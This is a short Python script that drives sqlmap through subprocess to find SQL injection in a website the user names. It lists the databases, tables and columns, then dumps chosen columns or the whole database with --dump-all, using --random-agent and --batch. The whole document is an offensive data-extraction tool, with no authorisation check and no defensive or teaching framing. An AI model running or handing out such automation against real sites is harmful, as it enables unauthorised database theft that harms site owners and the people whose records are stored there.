import subprocess

b=input("Do you want to extract all the data at once Press (Yes) or do you want to extract the data of your choice Press (No): ")

def Choice():
    x = input("Enter Your Website Name: ")
    subprocess.run(["sqlmap", "-u", x, "--dbs", "--batch", "--random-agent"])

    y = input("Enter Your Database Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y ,  "--tables", "--batch", "--random-agent"])

    z = input("Enter Your Table Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y ,"-T" ,z,"--columns", "--batch", "--random-agent"])

    a = input(["Enter Your Column Name: "])
    subprocess.run(["sqlmap", "-u", x, "-D", y ,"-T" ,z, "-C", a , "--dump", "--batch", "--random-agent"])


def All():
    x = input("Enter Your Website Name: ")
    subprocess.run(["sqlmap", "-u", x, "--dbs", "--batch", "--random-agent"])

    y = input("Enter Your Database Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y ,  "--tables", "--batch", "--random-agent"])
    subprocess.run(["sqlmap", "-u", x, "-D", y ,"--dump-all", "--batch", "--random-agent"]) 


    


if b.lower() == "yes":
    All()
elif b.upper() == "YES":
    All()
elif b.upper() == "NO":
    Choice()
elif b.lower() == "no":
    Choice()   
else:
  print(" Enter a Correct key")    
